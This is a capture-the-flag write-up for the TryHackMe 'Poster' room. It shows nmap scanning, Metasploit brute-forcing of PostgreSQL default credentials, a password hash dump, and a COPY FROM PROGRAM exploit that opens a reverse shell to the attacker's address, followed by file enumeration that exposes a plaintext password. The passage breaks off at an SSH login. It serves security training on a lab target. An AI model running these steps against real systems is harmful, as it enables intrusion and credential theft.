# Poster

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Easy
Tags: -
Subscription type: Free
Description:
The sys admin set up a rdbms in a safe way.
```

Room link: [https://tryhackme.com/room/poster](https://tryhackme.com/room/poster)

## Solution

### What is rdbms?

Depending on the EF Codd relational model, an RDBMS allows users to build, update, manage, and interact with a relational database, which stores data as a table.

Today, several companies use relational databases instead of flat files or hierarchical databases to store business data. This is because a relational database can handle a wide range of data formats and process queries efficiently. In addition, it organizes data into tables that can be linked internally based on common data. This allows the user to easily retrieve one or more tables with a single query. On the other hand, a flat file stores data in a single table structure, making it less efficient and consuming more space and memory.

Most commercially available RDBMSs currently use Structured Query Language (SQL) to access the database. RDBMS structures are most commonly used to perform CRUD operations (create, read, update, and delete), which are critical to support consistent data management.

### Check for services with nmap

We start by scanning the machine with `nmap` including service info and default scripts

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Poster]
└─$ export TARGET_IP=10.66.132.112

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Poster]
└─$ sudo nmap -sV -sC $TARGET_IP 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-01 11:39 CET
Nmap scan report for 10.66.132.112
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Poster CMS
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.94 seconds
```

We have three main services running and available:

- OpenSSH 7.2p2 on port 22
- Apache httpd 2.4.18 on port 80
- PostgreSQL DB on port 5432

#### What is the rdbms installed on the server?

Answer: `PostgreSQL`

#### What port is the rdbms running on?

Answer: `5432`

### Enumeration with Metasploit

Next, we search for an auxiliary module in Metasploit to find credentials

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Poster]
└─$ msfconsole -q          
msf > search type:auxiliary postgres

Matching Modules
================

   #   Name                                                       Disclosure Date  Rank    Check  Description
   -   ----                                                       ---------------  ----    -----  -----------
   0   auxiliary/server/capture/postgresql                        .                normal  No     Authentication Capture: PostgreSQL
   1   auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal  Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   2   auxiliary/analyze/crack_databases                          .                normal  No     Password Cracker: Databases
   3     \_ action: auto                                          .                .       .      Auto-selection of cracker
   4     \_ action: hashcat                                       .                .       .      Use Hashcat
   5     \_ action: john                                          .                .       .      Use John the Ripper
   6   auxiliary/scanner/postgres/postgres_dbname_flag_injection  .                normal  No     PostgreSQL Database Name Command Line Flag Injection
   7   auxiliary/scanner/postgres/postgres_login                  .                normal  No     PostgreSQL Login Utility
   8   auxiliary/admin/postgres/postgres_readfile                 .                normal  No     PostgreSQL Server Generic Query
   9   auxiliary/admin/postgres/postgres_sql                      .                normal  No     PostgreSQL Server Generic Query
   10  auxiliary/scanner/postgres/postgres_version                .                normal  No     PostgreSQL Version Probe
   11  auxiliary/scanner/postgres/postgres_hashdump               .                normal  No     Postgres Password Hashdump
   12  auxiliary/scanner/postgres/postgres_schemadump             .                normal  No     Postgres Schema Dump
   13  auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal  No     Ruby on Rails Devise Authentication Password Reset


Interact with a module by name or index. For example info 13, use 13 or use auxiliary/admin/http/rails_devise_pass_reset

msf > use 7
[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
msf auxiliary(scanner/postgres/postgres_login) > 
```

#### What is the full path of the modules (starting with auxiliary)?

Answer: `auxiliary/scanner/postgres/postgres_login`

### Search for credentials

Next, we configure and run the module

```bash
msf auxiliary(scanner/postgres/postgres_login) > options

Module options (auxiliary/scanner/postgres/postgres_login):

   Name              Current Setting                                              Required  Description
   ----              ---------------                                              --------  -----------
   ANONYMOUS_LOGIN   false                                                        yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false                                                        no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                            yes       How fast to bruteforce, from 0 to 5
   CreateSession     false                                                        no        Create a new session for every successful login
   DATABASE          template1                                                    yes       The database to authenticate against
   DB_ALL_CREDS      false                                                        no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                        no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                        no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                                         no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                                                                       no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_def  no        File containing passwords, one per line
                     ault_pass.txt
   Proxies                                                                        no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: http, sapni, socks4, socks5, s
                                                                                            ocks5h
   RETURN_ROWSET     true                                                         no        Set to true to see query result sets
   RHOSTS                                                                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT             5432                                                         yes       The target port
   STOP_ON_SUCCESS   false                                                        yes       Stop guessing when a credential works for a host
   THREADS           1                                                            yes       The number of concurrent threads (max one per host)
   USERNAME                                                                       no        A specific username to authenticate as
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_def  no        File containing (space-separated) users and passwords, one pair per line
                     ault_userpass.txt
   USER_AS_PASS      false                                                        no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_def  no        File containing users, one per line
                     ault_user.txt
   VERBOSE           true                                                         yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf auxiliary(scanner/postgres/postgres_login) > set RHOSTS 10.66.132.112
RHOSTS => 10.66.132.112
msf auxiliary(scanner/postgres/postgres_login) > run
[-] 10.66.132.112:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
[+] 10.66.132.112:5432 - Login Successful: postgres:password@template1
[-] 10.66.132.112:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.66.132.112:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Bruteforce completed, 1 credential was successful.
[*] You can open a Postgres session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
msf auxiliary(scanner/postgres/postgres_login) > 
```

Ah, we have a successful login for `postgres:password`.

#### What are the credentials you found?

Answer: `postgres:password`

### Get SQL-execution access

Then we search for a module to execute SQL-queries

```bash
msf auxiliary(scanner/postgres/postgres_login) > search type:auxiliary postgres

Matching Modules
================

   #   Name                                                       Disclosure Date  Rank    Check  Description
   -   ----                                                       ---------------  ----    -----  -----------
   0   auxiliary/server/capture/postgresql                        .                normal  No     Authentication Capture: PostgreSQL
   1   auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal  Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   2   auxiliary/analyze/crack_databases                          .                normal  No     Password Cracker: Databases
   3     \_ action: auto                                          .                .       .      Auto-selection of cracker
   4     \_ action: hashcat                                       .                .       .      Use Hashcat
   5     \_ action: john                                          .                .       .      Use John the Ripper
   6   auxiliary/scanner/postgres/postgres_dbname_flag_injection  .                normal  No     PostgreSQL Database Name Command Line Flag Injection
   7   auxiliary/scanner/postgres/postgres_login                  .                normal  No     PostgreSQL Login Utility
   8   auxiliary/admin/postgres/postgres_readfile                 .                normal  No     PostgreSQL Server Generic Query
   9   auxiliary/admin/postgres/postgres_sql                      .                normal  No     PostgreSQL Server Generic Query
   10  auxiliary/scanner/postgres/postgres_version                .                normal  No     PostgreSQL Version Probe
   11  auxiliary/scanner/postgres/postgres_hashdump               .                normal  No     Postgres Password Hashdump
   12  auxiliary/scanner/postgres/postgres_schemadump             .                normal  No     Postgres Schema Dump
   13  auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal  No     Ruby on Rails Devise Authentication Password Reset


Interact with a module by name or index. For example info 13, use 13 or use auxiliary/admin/http/rails_devise_pass_reset

msf auxiliary(scanner/postgres/postgres_login) > use 9
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf auxiliary(admin/postgres/postgres_sql) > 
```

#### What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?

Answer: `auxiliary/admin/postgres/postgres_sql`

We test the module with the default "payload"/query (`select version()`)

```bash
msf auxiliary(admin/postgres/postgres_sql) > options

Module options (auxiliary/admin/postgres/postgres_sql):

   Name           Current Setting   Required  Description
   ----           ---------------   --------  -----------
   RETURN_ROWSET  true              no        Set to true to see query result sets
   SQL            select version()  no        The SQL query to execute
   VERBOSE        false             no        Enable verbose output


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         no        The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     5432             no        The target port
   USERNAME  postgres         no        The username to authenticate as


View the full module info with the info, or info -d command.

msf auxiliary(admin/postgres/postgres_sql) > set RHOSTS 10.66.132.112
RHOSTS => 10.66.132.112
msf auxiliary(admin/postgres/postgres_sql) > set PASSWORD password
PASSWORD => password
msf auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.66.132.112
Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit

[*] Auxiliary module execution completed
msf auxiliary(admin/postgres/postgres_sql) > 
```

#### Based on the results of #6, what is the rdbms version installed on the server?

Answer: `9.5.21`

### Dump user hashes

Next, we look for a module to dump user hashes

```bash
msf auxiliary(admin/postgres/postgres_sql) > search type:auxiliary postgres

Matching Modules
================

   #   Name                                                       Disclosure Date  Rank    Check  Description
   -   ----                                                       ---------------  ----    -----  -----------
   0   auxiliary/server/capture/postgresql                        .                normal  No     Authentication Capture: PostgreSQL
   1   auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal  Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   2   auxiliary/analyze/crack_databases                          .                normal  No     Password Cracker: Databases
   3     \_ action: auto                                          .                .       .      Auto-selection of cracker
   4     \_ action: hashcat                                       .                .       .      Use Hashcat
   5     \_ action: john                                          .                .       .      Use John the Ripper
   6   auxiliary/scanner/postgres/postgres_dbname_flag_injection  .                normal  No     PostgreSQL Database Name Command Line Flag Injection
   7   auxiliary/scanner/postgres/postgres_login                  .                normal  No     PostgreSQL Login Utility
   8   auxiliary/admin/postgres/postgres_readfile                 .                normal  No     PostgreSQL Server Generic Query
   9   auxiliary/admin/postgres/postgres_sql                      .                normal  No     PostgreSQL Server Generic Query
   10  auxiliary/scanner/postgres/postgres_version                .                normal  No     PostgreSQL Version Probe
   11  auxiliary/scanner/postgres/postgres_hashdump               .                normal  No     Postgres Password Hashdump
   12  auxiliary/scanner/postgres/postgres_schemadump             .                normal  No     Postgres Schema Dump
   13  auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal  No     Ruby on Rails Devise Authentication Password Reset


Interact with a module by name or index. For example info 13, use 13 or use auxiliary/admin/http/rails_devise_pass_reset

msf auxiliary(admin/postgres/postgres_sql) > use 11
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf auxiliary(scanner/postgres/postgres_hashdump) > 
```

#### What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?

Answer: `auxiliary/scanner/postgres/postgres_hashdump`

We configure the module and run it

```bash
msf auxiliary(scanner/postgres/postgres_hashdump) > options

Module options (auxiliary/scanner/postgres/postgres_hashdump):

   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         no        The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     5432             no        The target port
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  postgres         no        The username to authenticate as


View the full module info with the info, or info -d command.

msf auxiliary(scanner/postgres/postgres_hashdump) > set RHOSTS 10.66.132.112
RHOSTS => 10.66.132.112
msf auxiliary(scanner/postgres/postgres_hashdump) > set PASSWORD password
PASSWORD => password
msf auxiliary(scanner/postgres/postgres_hashdump) > run
[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/postgres/postgres_hashdump) > 
```

We have 6 MD5-hashes.

#### How many user hashes does the module dump?

Answer: `6`

There is also a module for reading (configuration) files

```bash
msf auxiliary(scanner/postgres/postgres_hashdump) > search type:auxiliary postgres

Matching Modules
================

   #   Name                                                       Disclosure Date  Rank    Check  Description
   -   ----                                                       ---------------  ----    -----  -----------
   0   auxiliary/server/capture/postgresql                        .                normal  No     Authentication Capture: PostgreSQL
   1   auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal  Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   2   auxiliary/analyze/crack_databases                          .                normal  No     Password Cracker: Databases
   3     \_ action: auto                                          .                .       .      Auto-selection of cracker
   4     \_ action: hashcat                                       .                .       .      Use Hashcat
   5     \_ action: john                                          .                .       .      Use John the Ripper
   6   auxiliary/scanner/postgres/postgres_dbname_flag_injection  .                normal  No     PostgreSQL Database Name Command Line Flag Injection
   7   auxiliary/scanner/postgres/postgres_login                  .                normal  No     PostgreSQL Login Utility
   8   auxiliary/admin/postgres/postgres_readfile                 .                normal  No     PostgreSQL Server Generic Query
   9   auxiliary/admin/postgres/postgres_sql                      .                normal  No     PostgreSQL Server Generic Query
   10  auxiliary/scanner/postgres/postgres_version                .                normal  No     PostgreSQL Version Probe
   11  auxiliary/scanner/postgres/postgres_hashdump               .                normal  No     Postgres Password Hashdump
   12  auxiliary/scanner/postgres/postgres_schemadump             .                normal  No     Postgres Schema Dump
   13  auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal  No     Ruby on Rails Devise Authentication Password Reset


Interact with a module by name or index. For example info 13, use 13 or use auxiliary/admin/http/rails_devise_pass_reset

msf auxiliary(scanner/postgres/postgres_hashdump) > use 8
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf auxiliary(admin/postgres/postgres_readfile) > 
```

#### What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?

Answer: `auxiliary/admin/postgres/postgres_readfile`

### Get command execution

What we really want to do is execute OS commands, so let's search for a module for that

```bash
msf auxiliary(admin/postgres/postgres_readfile) > search type:exploit postgres

Matching Modules
================

   #   Name                                                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                                                      ---------------  ----       -----  -----------
   0   exploit/linux/http/acronis_cyber_infra_cve_2023_45249                                     2024-07-24       excellent  Yes    Acronis Cyber Infrastructure default password remote code execution
   1     \_ target: Unix/Linux Command                                                           .                .          .      .
   2     \_ target: Interactive SSH                                                              .                .          .      .
   3   exploit/linux/http/appsmith_rce_cve_2024_55964                                            2025-03-25       excellent  Yes    Appsmith RCE
   4   exploit/linux/http/beyondtrust_pra_rs_unauth_rce                                          2024-12-16       excellent  Yes    BeyondTrust Privileged Remote Access (PRA) and Remote Support (RS) unauthenticated Remote Code Execution
   5   exploit/multi/http/manage_engine_dc_pmp_sqli                                              2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   6     \_ target: Automatic                                                                    .                .          .      .
   7     \_ target: Desktop Central v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows           .                .          .      .
   8     \_ target: Desktop Central MSP v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows       .                .          .      .
   9     \_ target: Desktop Central [MSP] v7 >= b70200 / v8 / v9 < b90039 (MySQL) on Windows     .                .          .      .
   10    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Windows  .                .          .      .
   11    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Windows             .                .          .      .
   12    \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Linux    .                .          .      .
   13    \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Linux               .                .          .      .
   14  exploit/windows/misc/manageengine_eventlog_analyzer_rce                                   2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
   15  exploit/multi/postgres/postgres_copy_from_program_cmd_exec                                2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   16    \_ target: Automatic                                                                    .                .          .      .
   17    \_ target: Unix/OSX/Linux                                                               .                .          .      .
   18    \_ target: Windows - PowerShell (In-Memory)                                             .                .          .      .
   19    \_ target: Windows (CMD)                                                                .                .          .      .
   20  exploit/multi/postgres/postgres_createlang                                                2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   21  exploit/linux/postgres/postgres_payload                                                   2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   22    \_ target: Linux x86                                                                    .                .          .      .
   23    \_ target: Linux x86_64                                                                 .                .          .      .
   24  exploit/windows/postgres/postgres_payload                                                 2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   25    \_ target: Windows x86                                                                  .                .          .      .
   26    \_ target: Windows x64                                                                  .                .          .      .
   27  exploit/multi/http/rudder_server_sqli_rce                                                 2023-06-16       excellent  Yes    Rudder Server SQLI Remote Code Execution


Interact with a module by name or index. For example info 27, use 27 or use exploit/multi/http/rudder_server_sqli_rce

msf auxiliary(admin/postgres/postgres_readfile) > use 15
[*] Using configured payload cmd/unix/reverse_perl
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > 
```

#### What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?

Answer: `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`

### Get the user flag

Next, we configure the module

```bash
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > options

Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (For Debugging)
   TABLENAME          uTPKoqREd        yes       A table name that does not exist (To avoid deletion)


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         no        The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     5432             no        The target port (TCP)
   USERNAME  postgres         no        The username to authenticate as


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set RHOSTS 10.66.132.112
RHOSTS => 10.66.132.112
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set PASSWORD password
PASSWORD => password
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set LHOST tun0
LHOST => 192.168.187.183
msf exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > exploit
[*] Started reverse TCP handler on 192.168.187.183:4444 
[*] 10.66.132.112:5432 - 10.66.132.112:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.66.132.112:5432 - Exploiting...
[+] 10.66.132.112:5432 - 10.66.132.112:5432 - uTPKoqREd dropped successfully
[+] 10.66.132.112:5432 - 10.66.132.112:5432 - uTPKoqREd created successfully
[+] 10.66.132.112:5432 - 10.66.132.112:5432 - uTPKoqREd copied successfully(valid syntax/command)
[+] 10.66.132.112:5432 - 10.66.132.112:5432 - uTPKoqREd dropped successfully(Cleaned)
[*] 10.66.132.112:5432 - Exploit Succeeded
[*] Command shell session 1 opened (192.168.187.183:4444 -> 10.66.132.112:47036) at 2026-01-01 12:31:40 +0100

id
uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
```

And use it to search for the user flag

```bash
find / -name user.txt -type f 2>/dev/null
/home/alison/user.txt
ls -l /home/alison/user.txt
-rw------- 1 alison alison 35 Jul 28  2020 /home/alison/user.txt
```

The `user.txt` flag is in the user `alison`'s home directory but we are currently unable to read it.

### Emumerate files

Now we check for any interesting files and directories under `/home`.

```bash
ls -l /home
total 8
drwxr-xr-x 4 alison alison 4096 Jul 28  2020 alison
drwxr-xr-x 2 dark   dark   4096 Jul 28  2020 dark
ls -la /home/alison
total 40
drwxr-xr-x 4 alison alison 4096 Jul 28  2020 .
drwxr-xr-x 4 root   root   4096 Jul 28  2020 ..
-rw------- 1 alison alison 2444 Jul 28  2020 .bash_history
-rw-r--r-- 1 alison alison  220 Jul 28  2020 .bash_logout
-rw-r--r-- 1 alison alison 3771 Jul 28  2020 .bashrc
drwx------ 2 alison alison 4096 Jul 28  2020 .cache
drwxr-xr-x 2 alison alison 4096 Jul 28  2020 .nano
-rw-r--r-- 1 alison alison  655 Jul 28  2020 .profile
-rw-r--r-- 1 alison alison    0 Jul 28  2020 .sudo_as_admin_successful
-rw------- 1 alison alison   35 Jul 28  2020 user.txt
-rw-r--r-- 1 root   root    183 Jul 28  2020 .wget-hsts
cd /home/dark
ls -la
total 92
drwx------ 19 postgres postgres 4096 Jan  1 02:20 .
drwxr-xr-x  3 postgres postgres 4096 Jul 28  2020 ..
drwx------  5 postgres postgres 4096 Jul 28  2020 base
drwx------  2 postgres postgres 4096 Jan  1 02:21 global
drwx------  2 postgres postgres 4096 Jul 28  2020 pg_clog
drwx------  2 postgres postgres 4096 Jul 28  2020 pg_commit_ts
drwx------  2 postgres postgres 4096 Jul 28  2020 pg_dynshmem
drwx------  4 postgres postgres 4096 Jul 28  2020 pg_logical
drwx------  4 postgres postgres 4096 Jul 28  2020 pg_multixact
drwx------  2 postgres postgres 4096 Jan  1 02:20 pg_notify
drwx------  2 postgres postgres 4096 Jul 28  2020 pg_replslot
drwx------  2 postgres postgres 4096 Jul 28  2020 pg_serial
drwx------  2 postgres postgres 4096 Jul 28  2020 pg_snapshots
drwx------  2 postgres postgres 4096 Jan  1 02:20 pg_stat
drwx------  2 postgres postgres 4096 Jul 28  2020 pg_stat_tmp
drwx------  2 postgres postgres 4096 Jul 28  2020 pg_subtrans
drwx------  2 postgres postgres 4096 Jul 28  2020 pg_tblspc
drwx------  2 postgres postgres 4096 Jul 28  2020 pg_twophase
-rw-------  1 postgres postgres    4 Jul 28  2020 PG_VERSION
drwx------  3 postgres postgres 4096 Jul 28  2020 pg_xlog
-rw-------  1 postgres postgres   88 Jul 28  2020 postgresql.auto.conf
-rw-------  1 postgres postgres  133 Jan  1 02:20 postmaster.opts
-rw-------  1 postgres postgres   91 Jan  1 02:20 postmaster.pid
```

Nothing obvious other than that `alison` has been running `sudo` commands.

Let's search for files owned by `alison` more broadly

```bash
find / -type f -user alison 2>/dev/null
/home/alison/.bashrc
/home/alison/.bash_logout
/home/alison/.profile
/home/alison/.bash_history
/home/alison/.sudo_as_admin_successful
/home/alison/user.txt
/var/www/html/config.php
/var/www/html/poster/assets/css/main.css
/var/www/html/poster/assets/css/fontawesome-all.min.css
/var/www/html/poster/assets/sass/libs/_mixins.scss
/var/www/html/poster/assets/sass/libs/_functions.scss
/var/www/html/poster/assets/sass/libs/_vars.scss
/var/www/html/poster/assets/sass/libs/_vendor.scss
/var/www/html/poster/assets/sass/libs/_breakpoints.scss
/var/www/html/poster/assets/sass/main.scss
/var/www/html/poster/assets/sass/components/_icon.scss
/var/www/html/poster/assets/sass/components/_form.scss
/var/www/html/poster/assets/sass/components/_button.scss
/var/www/html/poster/assets/sass/components/_section.scss
/var/www/html/poster/assets/sass/components/_icons.scss
/var/www/html/poster/assets/sass/components/_list.scss
/var/www/html/poster/assets/sass/layout/_header.scss
/var/www/html/poster/assets/sass/layout/_footer.scss
/var/www/html/poster/assets/sass/layout/_signup-form.scss
/var/www/html/poster/assets/sass/base/_typography.scss
/var/www/html/poster/assets/sass/base/_reset.scss
/var/www/html/poster/assets/sass/base/_bg.scss
/var/www/html/poster/assets/sass/base/_page.scss
/var/www/html/poster/assets/webfonts/fa-brands-400.svg
/var/www/html/poster/assets/webfonts/fa-solid-900.eot
/var/www/html/poster/assets/webfonts/fa-regular-400.woff2
/var/www/html/poster/assets/webfonts/fa-brands-400.ttf
/var/www/html/poster/assets/webfonts/fa-solid-900.ttf
/var/www/html/poster/assets/webfonts/fa-brands-400.eot
/var/www/html/poster/assets/webfonts/fa-brands-400.woff
/var/www/html/poster/assets/webfonts/fa-solid-900.woff
/var/www/html/poster/assets/webfonts/fa-regular-400.eot
/var/www/html/poster/assets/webfonts/fa-solid-900.woff2
/var/www/html/poster/assets/webfonts/fa-brands-400.woff2
/var/www/html/poster/assets/webfonts/fa-regular-400.ttf
/var/www/html/poster/assets/webfonts/fa-solid-900.svg
/var/www/html/poster/assets/webfonts/fa-regular-400.svg
/var/www/html/poster/assets/webfonts/fa-regular-400.woff
/var/www/html/poster/assets/js/main.js
/var/www/html/poster/index.html
/var/www/html/poster/images/bg02.jpg
/var/www/html/poster/images/bg01.jpg
/var/www/html/poster/images/bg03.jpg
```

The `config.php` file sounds promising

```bash
cat /var/www/html/config.php
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "p4ssw0rdS3cur3!#";
        $dbname = "mysudopassword";
?>
```

We have a password to try (`p4ssw0rdS3cur3!#`).

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Poster]
└─$ ssh alison@$TARGET_IP       
The authenticity of host '10.66.132.112 (10.66.132.112)' can't be established.
ED25519 key fingerprint is SHA256:8bd9QsiWgYCCiNEifxZv+F0jblZZnuBhOKgM6saFGCE.
